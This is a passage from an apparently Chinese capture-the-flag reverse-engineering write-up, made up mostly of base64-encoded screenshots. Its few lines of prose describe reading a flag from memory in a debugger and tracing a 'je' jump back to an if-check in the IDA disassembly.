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
AElFTkSuQmCC'/></p>
<p>这里不知道为什么我在另一台电脑上是可以直接在消息弹唱中看到<strong>flag</strong>的，但我这个正常输出后只有弹窗内容不显示，所以直接走到txet这里停下，查看内存地址，因为消息框正文是储存在相应内存空间的</p>
<p><img src='data:img/jpg;base64,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
gg=='/></p>
<p>果然是flag<br>然后突然想到，刚刚那个跳掉该消息框的je跳转不是对应的ida反汇编里面的if判断么，也就是if判断生效后执行的函数里面是转码函数，因为if条件实现后运行程序终止的函数，我一直都没看中间那个函数，血亏啊，浪费好多时间</p>
<p>查看if条件实现后运行的这个函数的内部结构</p>
<p><img src='data:img/jpg;base64,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
